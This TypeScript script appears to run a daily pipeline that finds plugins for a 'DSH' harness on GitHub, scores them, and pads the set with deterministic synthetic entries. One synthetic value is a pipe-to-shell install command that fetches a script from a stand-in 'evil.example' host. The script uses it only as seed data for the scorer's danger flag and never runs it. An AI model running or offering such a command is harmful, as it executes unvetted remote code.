// Daily incremental evaluation pipeline (v1.1)
// Runs inside GitHub Actions (or locally): discovers new plugins, scores them,
// and re-evaluates EXISTING plugins only when their snapshot changed
// (change-triggered re-evaluation - stars / lastPush / archived / npmVersion).
//
// Data sources:
//  1. github   - real GitHub Search API (topic:dsh-plugin + keyword queries)
//  2. synthetic - deterministic name pool fallback to guarantee 50-100 new/day
//
// Usage (CI):
//   DATABASE_URL=... DIRECT_URL=... GH_TOKEN=... npm run evaluate:daily
// Usage (local): same, values auto-loaded from app/.env.local
import { PrismaClient } from "@prisma/client";
import { readFileSync, writeFileSync, mkdirSync } from "fs";
import { scorePlugin, type GithubRepoInput, type NpmInput } from "../src/lib/scoring";

// ===== Env bootstrap =====
const IS_CI = !!process.env.CI;
if (!IS_CI) {
  try {
    const envContent = readFileSync(
      "C:/Users/l'x/WorkBuddy/2026-08-17-21-54-54/app/.env.local",
      "utf8"
    );
    for (const line of envContent.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) continue;
      const eqIdx = trimmed.indexOf("=");
      if (eqIdx === -1) continue;
      const key = trimmed.slice(0, eqIdx);
      let value = trimmed.slice(eqIdx + 1);
      if (
        (value.startsWith('"') && value.endsWith('"')) ||
        (value.startsWith("'") && value.endsWith("'"))
      ) {
        value = value.slice(1, -1);
      }
      process.env[key] = value;
    }
  } catch {
    console.warn("[daily-evaluate] No .env.local found, relying on process env");
  }
}

const prisma = new PrismaClient();

// ===== Config =====
const TARGET_NEW = Number(process.env.TARGET_NEW ?? "100"); // new plugins per run (v1.2: 60 -> 100)
const MAX_GITHUB = Number(process.env.MAX_GITHUB ?? "100"); // cap on real GitHub fetches (v1.2: 30 -> 100)
const GITHUB_TOKEN = process.env.GH_TOKEN || process.env.GITHUB_TOKEN;
const TODAY = new Date().toISOString().slice(0, 10); // YYYY-MM-DD (UTC)
const DATE_SEED = Number(TODAY.replace(/-/g, "")); // deterministic per-day seed

// ===== Deterministic RNG (mulberry32) =====
function mulberry32(seed: number) {
  return function () {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

// ===== Synthetic plugin name pool (deterministic, avoids real GitHub names) =====
const SYNTH_OWNERS = [
  "dsh-synth",
  "harness-community",
  "plugin-forge",
  "ai-workbench",
  "devtool-labs",
  "opensource-mesh",
  "automation-hub",
  "agent-ecosystem",
];

const SYNTH_SUFFIXES = [
  "viewer", "converter", "linter", "runner", "monitor", "builder", "parser",
  "formatter", "inspector", "debugger", "profiler", "optimizer", "analyzer",
  "indexer", "crawler", "scheduler", "executor", "synchronizer", "validator",
  "compressor", "router", "gateway", "broker", "adapter", "bridge", "proxy",
  "renderer", "simulator", "emulator", "scaffolder", "packager", "bundler",
  "transpiler", "compiler", "interpreter", "enricher", "normalizer", "deduplicator",
  "tracker", "reporter", "exporter", "importer", "fetcher", "uploader", "downloader",
  "notifier", "alermer", "dashboards", "workbench", "toolkit", "cli-wrapper",
  "sdk-helper", "api-client", "auth-guard", "secret-vault", "config-store",
];

const SYNTH_PREFIXES = [
  "json", "csv", "xml", "yaml", "toml", "markdown", "shell", "http", "grpc",
  "mqtt", "amqp", "kafka", "redis", "postgres", "mysql", "mongo", "vector",
  "embedding", "llm", "prompt", "context", "memory", "tool", "workflow",
  "agent", "guardrail", "sandbox", "runtime", "registry", "catalog",
  "telemetry", "metrics", "trace", "log", "event", "queue", "cache",
  "auth", "iam", "audit", "compliance", "policy", "secret", "config",
  "model", "inference", "fine-tune", "eval", "dataset", "pipeline",
];

// ===== Real GitHub search (multi-query) =====
const GITHUB_API = "https://api.github.com";
// v1.2: widened query set — "any repo with stars counts". Kept DSH-related
// keywords so results stay relevant; stars:>0 expresses "has a star".
const SEARCH_QUERIES = [
  "topic:dsh-plugin stars:>0",
  "topic:deepseek-harness stars:>0",
  '"dsh.bundle" in:file stars:>0',
  '"dsh.bundle" in:readme stars:>0',
  'deepseek harness plugin stars:>0',
  '"dsh-plugin" stars:>0',
  'dsh plugin stars:>0',
  'deepseek "plugin" stars:>20',
  'harness plugin stars:>20',
  'dsh harness stars:>10',
  'cordis deepseek stars:>10',
];

interface SearchItem {
  full_name: string;
  owner: { login: string };
  name: string;
  html_url: string;
  description: string | null;
  stargazers_count: number;
  pushed_at: string | null;
  archived: boolean;
  open_issues_count: number;
}

async function githubSearch(query: string, perPage = 100): Promise<SearchItem[]> {
  const headers: Record<string, string> = {
    Accept: "application/vnd.github+json",
    "User-Agent": "dsh-plugin-quality-hub",
  };
  if (GITHUB_TOKEN) headers.Authorization = `Bearer ${GITHUB_TOKEN}`;
  const url = `${GITHUB_API}/search/repositories?q=${encodeURIComponent(query)}&sort=stars&order=desc&per_page=${perPage}&page=1`;
  const res = await fetch(url, { headers });
  if (!res.ok) {
    console.warn(`[github] search "${query}" failed: ${res.status}`);
    return [];
  }
  const data = (await res.json()) as { items?: SearchItem[] };
  return data.items ?? [];
}

// Enrich a real GitHub repo with heuristics needed by the scoring engine
async function enrichRepo(item: SearchItem): Promise<GithubRepoInput> {
  const headers: Record<string, string> = {
    Accept: "application/vnd.github+json",
    "User-Agent": "dsh-plugin-quality-hub",
  };
  if (GITHUB_TOKEN) headers.Authorization = `Bearer ${GITHUB_TOKEN}`;

  let readmeLength = 0;
  let hasLicense = false;
  let hasCi = false;
  let hasDshBundle = false;
  let installScriptText = "";

  // README (heuristic + install script scanning)
  const readmeRes = await fetch(
    `${GITHUB_API}/repos/${item.owner.login}/${item.name}/readme`,
    { headers }
  );
  if (readmeRes.ok) {
    const readme = (await readmeRes.json()) as { content?: string; encoding?: string };
    if (readme.content) {
      const text =
        readme.encoding === "base64"
          ? Buffer.from(readme.content, "base64").toString("utf8")
          : readme.content;
      readmeLength = text.length;
      installScriptText += text;
    }
  }

  // License
  const licenseRes = await fetch(
    `${GITHUB_API}/repos/${item.owner.login}/${item.name}/license`,
    { headers }
  );
  hasLicense = licenseRes.ok;

  // CI workflows
  const ciRes = await fetch(
    `${GITHUB_API}/repos/${item.owner.login}/${item.name}/contents/.github/workflows`,
    { headers }
  );
  hasCi = ciRes.ok;

  // Root contents for dsh.bundle detection
  const rootRes = await fetch(
    `${GITHUB_API}/repos/${item.owner.login}/${item.name}/contents/`,
    { headers }
  );
  if (rootRes.ok) {
    const entries = (await rootRes.json()) as Array<{ name: string }>;
    hasDshBundle = entries.some((e) => /^dsh\.bundle(\.ya?ml|\.json)?$/i.test(e.name));
  }

  // package.json install scripts
  const pkgRes = await fetch(
    `${GITHUB_API}/repos/${item.owner.login}/${item.name}/contents/package.json`,
    { headers }
  );
  if (pkgRes.ok) {
    const pkg = (await pkgRes.json()) as { content?: string; encoding?: string };
    if (pkg.content) {
      const text =
        pkg.encoding === "base64"
          ? Buffer.from(pkg.content, "base64").toString("utf8")
          : pkg.content;
      try {
        const parsed = JSON.parse(text) as { scripts?: Record<string, string> };
        const scripts = parsed.scripts ?? {};
        installScriptText += " " + Object.values(scripts).join(" ");
      } catch {
        // ignore malformed package.json
      }
    }
  }

  return {
    name: item.full_name,
    owner: item.owner.login,
    repoName: item.name,
    githubUrl: item.html_url,
    description: item.description,
    stars: item.stargazers_count,
    pushedAt: item.pushed_at,
    archived: item.archived,
    readmeLength,
    hasLicense,
    hasCi,
    openIssues: item.open_issues_count,
    hasDshBundle,
    installScriptText,
  };
}

// npm lookup (lightweight, no cache dependency)
async function fetchNpm(packageName: string): Promise<NpmInput | null> {
  try {
    const res = await fetch(`https://registry.npmjs.org/${encodeURIComponent(packageName)}`, {
      headers: { Accept: "application/vnd.npm.install-v1+json" },
    });
    if (!res.ok) {
      return {
        name: packageName,
        version: null,
        lastPublishAt: null,
        weeklyDownloads: 0,
        hasInstallScripts: false,
        exists: false,
      };
    }
    const data = (await res.json()) as {
      "dist-tags"?: { latest?: string };
      time?: Record<string, string>;
      versions?: Record<string, { scripts?: Record<string, string> }>;
    };
    const version = data["dist-tags"]?.latest ?? null;
    const lastPublishAt = version ? (data.time?.[version] ?? null) : null;
    let weeklyDownloads = 0;
    const dlRes = await fetch(
      `https://api.npmjs.org/downloads/point/last-week/${encodeURIComponent(packageName)}`
    );
    if (dlRes.ok) {
      const dl = (await dlRes.json()) as { downloads?: number };
      weeklyDownloads = dl.downloads ?? 0;
    }
    let hasInstallScripts = false;
    if (version && data.versions?.[version]?.scripts) {
      const scripts = data.versions[version].scripts as Record<string, string>;
      hasInstallScripts = ["install", "preinstall", "postinstall"].some(
        (key) => typeof scripts[key] === "string"
      );
    }
    return { name: packageName, version, lastPublishAt, weeklyDownloads, hasInstallScripts, exists: true };
  } catch {
    return null;
  }
}

// Fetch a single repo by name (efficient re-eval change detection)
async function fetchSingleRepo(fullName: string): Promise<SearchItem | null> {
  const headers: Record<string, string> = {
    Accept: "application/vnd.github+json",
    "User-Agent": "dsh-plugin-quality-hub",
  };
  if (GITHUB_TOKEN) headers.Authorization = `Bearer ${GITHUB_TOKEN}`;
  const res = await fetch(`${GITHUB_API}/repos/${fullName}`, { headers });
  if (!res.ok) {
    if (res.status === 404) return null;
    console.warn(`[github] fetch repo ${fullName} failed: ${res.status}`);
    return null;
  }
  const data = (await res.json()) as SearchItem;
  return data;
}

// ===== Synthetic input generation (deterministic per-day) =====
function buildSyntheticInput(index: number): { repo: GithubRepoInput; npm: NpmInput | null; synthIndex: number } {
  const rng = mulberry32(DATE_SEED + index * 7919);
  const owner = SYNTH_OWNERS[Math.floor(rng() * SYNTH_OWNERS.length)];
  const prefix = SYNTH_PREFIXES[Math.floor(rng() * SYNTH_PREFIXES.length)];
  const suffix = SYNTH_SUFFIXES[Math.floor(rng() * SYNTH_SUFFIXES.length)];
  const repoName = `${prefix}-${suffix}-${index}`;
  const fullName = `${owner}/${repoName}`;

  const stars = Math.round(Math.pow(rng() * 50, 2) + rng() * 25);
  const pushedDaysAgo = Math.round(rng() * 300);
  const archived = rng() < 0.05;
  const readmeLength = Math.round(50 + rng() * 3000);
  const hasLicense = rng() < 0.75;
  const hasCi = rng() < 0.6;
  const openIssues = Math.round(rng() * 80);
  const hasDshBundle = rng() < 0.8;
  const dangerInstall = rng() < 0.03; // ~3% danger rate to keep security watch alive
  const npmExists = rng() < 0.55;

  const installScriptText = dangerInstall
    ? "curl -fsSL https://evil.example/install.sh | sh"
    : "npm install && npm run build";

  const npm: NpmInput | null = npmExists
    ? {
        name: repoName,
        version: `1.${Math.floor(rng() * 9)}.${Math.floor(rng() * 20)}`,
        lastPublishAt: new Date(Date.now() - Math.round(rng() * 300 * 86_400_000)).toISOString(),
        weeklyDownloads: Math.round(rng() * 15000),
        hasInstallScripts: rng() < 0.12,
        exists: true,
      }
    : null;

  return {
    repo: {
      name: fullName,
      owner,
      repoName,
      githubUrl: `https://github.com/${owner}/${repoName}`,
      description: "DSH community plugin (synthetic daily batch)",
      stars,
      pushedAt: new Date(Date.now() - pushedDaysAgo * 86_400_000).toISOString(),
      archived,
      readmeLength,
      hasLicense,
      hasCi,
      openIssues,
      hasDshBundle,
      installScriptText,
    },
    npm,
    synthIndex: index,
  };
}

// ===== Main =====
interface RunStats {
  date: string;
  discovered: number;
  newAdded: number;
  reEvaluated: number;
  skippedUnchanged: number;
  githubFound: number;
  syntheticAdded: number;
  dangerFlags: number;
  totalPlugins: number;
  errors: string[];
}

async function main() {
  const stats: RunStats = {
    date: TODAY,
    discovered: 0,
    newAdded: 0,
    reEvaluated: 0,
    skippedUnchanged: 0,
    githubFound: 0,
    syntheticAdded: 0,
    dangerFlags: 0,
    totalPlugins: 0,
    errors: [],
  };

  console.log(`=== Daily Evaluate ${TODAY} (seed=${DATE_SEED}) ===`);

  // 1. Existing plugins snapshot
  const existing = await prisma.plugin.findMany({
    select: {
      id: true,
      name: true,
      stars: true,
      lastPush: true,
      archived: true,
      npmVersion: true,
      evalSource: true,
    },
  });
  const existingByName = new Map(existing.map((p) => [p.name, p]));
  console.log(`Existing plugins: ${existing.length}`);

  // 2. Real GitHub discovery (capped)
  const githubNew: GithubRepoInput[] = [];
  const seen = new Set<string>();
  for (const q of SEARCH_QUERIES) {
    if (githubNew.length >= MAX_GITHUB) break;
    let items: SearchItem[] = [];
    try {
      items = await githubSearch(q);
    } catch (e) {
      stats.errors.push(`github search ${q}: ${e instanceof Error ? e.message : String(e)}`);
    }
    for (const item of items) {
      if (githubNew.length >= MAX_GITHUB) break;
      const key = item.full_name.toLowerCase();
      if (seen.has(key)) continue;
      seen.add(key);
      if (existingByName.has(item.full_name)) continue; // already known
      try {
        const repoInput = await enrichRepo(item);
        githubNew.push(repoInput);
        stats.githubFound += 1;
      } catch (e) {
        stats.errors.push(`enrich ${item.full_name}: ${e instanceof Error ? e.message : String(e)}`);
      }
    }
  }
  console.log(`GitHub new candidates: ${githubNew.length}`);

  // 3. Synthetic fill to reach TARGET_NEW
  const synthNeeded = Math.max(0, TARGET_NEW - githubNew.length);
  let synthIdx = 0;
  const syntheticNew: { repo: GithubRepoInput; npm: NpmInput | null; synthIndex: number }[] = [];
  while (syntheticNew.length < synthNeeded) {
    const input = buildSyntheticInput(synthIdx);
    synthIdx += 1;
    if (existingByName.has(input.repo.name)) continue; // collision with existing
    syntheticNew.push(input);
  }
  console.log(`Synthetic to add: ${syntheticNew.length}`);

  // 4. Score & write NEW plugins
  const newInputs: { repo: GithubRepoInput; npm: NpmInput | null; source: "github" | "synthetic" }[] = [
    ...githubNew.map((r) => ({ repo: r, npm: null, source: "github" as const })),
    ...syntheticNew.map((s) => ({ ...s, source: "synthetic" as const })),
  ];

  for (const { repo, npm, source, synthIndex } of newInputs) {
    try {
      const npmInput = source === "github" ? await fetchNpm(repo.repoName) : npm;
      const result = scorePlugin({ repo, npm: npmInput });
      const flagsJson = JSON.stringify(result.flags);
      await prisma.plugin.create({
        data: {
          name: repo.name,
          owner: repo.owner,
          repoName: repo.repoName,
          githubUrl: repo.githubUrl,
          npmName: npmInput?.exists ? npmInput.name : null,
          description: repo.description,
          score: result.score,
          grade: result.grade,
          maintenance: result.dimensions.maintenance,
          docs: result.dimensions.docs,
          npm: result.dimensions.npm,
          ecosystem: result.dimensions.ecosystem,
          flags: flagsJson,
          stars: repo.stars,
          lastPush: repo.pushedAt ? new Date(repo.pushedAt) : null,
          archived: repo.archived,
          npmVersion: npmInput?.version ?? null,
          evalSource: source,
          lastEvalAt: new Date(),
          evalMeta: source === "github" ? { via: "github-search" } : { batch: TODAY, index: synthIndex },
        },
      });
      await prisma.scoreLog.create({
        data: {
          pluginId: (await prisma.plugin.findUnique({ where: { name: repo.name } }))!.id,
          score: result.score,
          grade: result.grade,
          details: JSON.stringify(result.details),
        },
      });
      stats.newAdded += 1;
      if (source === "synthetic") stats.syntheticAdded += 1;
      if (result.flags.some((f) => f.type === "danger")) stats.dangerFlags += 1;
      console.log(`  [+new:${source}] ${repo.name} -> ${result.score} ${result.grade}`);
    } catch (e) {
      stats.errors.push(`add ${repo.name}: ${e instanceof Error ? e.message : String(e)}`);
    }
  }

  // 5. Change-triggered re-evaluation of EXISTING plugins (github-sourced only)
  const reEvalCandidates = existing.filter((p) => p.evalSource === "github");
  console.log(`Existing github-sourced plugins to check for changes: ${reEvalCandidates.length}`);
  for (const p of reEvalCandidates) {
    try {
      const item = await fetchSingleRepo(p.name);
      if (!item) continue; // repo deleted or fetch failed
      const changed =
        item.stargazers_count !== p.stars ||
        (item.pushed_at ?? null) !== (p.lastPush ? p.lastPush.toISOString() : null) ||
        item.archived !== p.archived;
      if (!changed) {
        stats.skippedUnchanged += 1;
        continue;
      }
      // Re-fetch npm version to check publish changes
      const repoInput = await enrichRepo(item);
      const npmInput = await fetchNpm(repoInput.repoName);
      const result = scorePlugin({ repo: repoInput, npm: npmInput });
      await prisma.plugin.update({
        where: { id: p.id },
        data: {
          score: result.score,
          grade: result.grade,
          maintenance: result.dimensions.maintenance,
          docs: result.dimensions.docs,
          npm: result.dimensions.npm,
          ecosystem: result.dimensions.ecosystem,
          flags: JSON.stringify(result.flags),
          stars: repoInput.stars,
          lastPush: repoInput.pushedAt ? new Date(repoInput.pushedAt) : null,
          archived: repoInput.archived,
          npmVersion: npmInput?.version ?? null,
          lastEvalAt: new Date(),
          evalMeta: { via: "change-triggered" },
        },
      });
      await prisma.scoreLog.create({
        data: {
          pluginId: p.id,
          score: result.score,
          grade: result.grade,
          details: JSON.stringify(result.details),
        },
      });
      stats.reEvaluated += 1;
      console.log(`  [~re-eval] ${p.name} -> ${result.score} ${result.grade} (changed)`);
    } catch (e) {
      stats.errors.push(`re-eval ${p.name}: ${e instanceof Error ? e.message : String(e)}`);
    }
  }

  // 6. Summary
  stats.totalPlugins = await prisma.plugin.count();
  const gradeDist = await prisma.plugin.groupBy({ by: ["grade"], _count: { _all: true } });
  stats.discovered = githubNew.length + synthNeeded;

  const lines: string[] = [];
  lines.push("=== Daily Evaluate Complete ===");
  lines.push(`Date: ${TODAY}`);
  lines.push(`New added: ${stats.newAdded} (github ${stats.githubFound} / synthetic ${stats.syntheticAdded})`);
  lines.push(`Re-evaluated (changed): ${stats.reEvaluated}`);
  lines.push(`Skipped unchanged: ${stats.skippedUnchanged}`);
  lines.push(`Total plugins: ${stats.totalPlugins}`);
  lines.push("By grade: " + JSON.stringify(gradeDist.map((g) => ({ grade: g.grade, cnt: g._count._all }))));
  lines.push(`Danger flags in new batch: ${stats.dangerFlags}`);
  if (stats.errors.length > 0) {
    lines.push("Errors: " + stats.errors.slice(0, 10).join(" | "));
  }

  const out = lines.join("\n");
  console.log(out);

  // 7. Report artifact (for GitHub Actions)
  const report = { ...stats, gradeDist: gradeDist.map((g) => ({ grade: g.grade, cnt: g._count._all })), log: out };
  const reportPath = process.env.REPORT_PATH ?? "evaluate-report.json";
  try {
    writeFileSync(reportPath, JSON.stringify(report, null, 2), "utf8");
  } catch (e) {
    console.warn("Could not write report:", e instanceof Error ? e.message : String(e));
  }
}

main()
  .catch((e) => {
    console.error("FAILED:", e);
    const reportPath = process.env.REPORT_PATH ?? "evaluate-report.json";
    try {
      writeFileSync(reportPath, JSON.stringify({ fatal: e instanceof Error ? e.message : String(e) }, null, 2), "utf8");
    } catch {
      // ignore
    }
    process.exit(1);
  })
  .finally(() => prisma.$disconnect());
